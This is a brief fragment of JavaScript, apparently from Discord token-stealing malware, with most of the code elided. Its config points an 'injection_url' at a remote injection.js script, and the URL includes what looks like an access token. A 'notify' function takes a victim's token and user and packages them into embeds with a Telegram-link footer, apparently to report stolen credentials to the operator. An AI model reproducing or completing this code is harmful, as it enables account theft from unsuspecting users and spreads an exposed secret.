...
const CONFIG = {
    ...
    injection_url: 'https://raw.githubusercontent.com/iilovepussy/injection/injection.js?token=GHSAT0AAAAAAC7ZMBM7LUUMEA7CVTWUKZAGZ7YJAUQ',
...
const notify = async (ctx, token, user) => {
    ...
    ctx.embeds.forEach(embed => {
        ...
        embed.footer = {
            text: 't.me/ryvouchs',
            icon_url: "https://media.discordapp.net/attachments/1353074513176170726/1353076924003516536/IMG_1985.jpg?ex=67f8ba55&is=67f768d5&hm=cddf537b3924c0074128fa6c0dd23b271af4b4eb1333fb3e6566622214890d57&=&format=webp&width=438&height=562",
        };
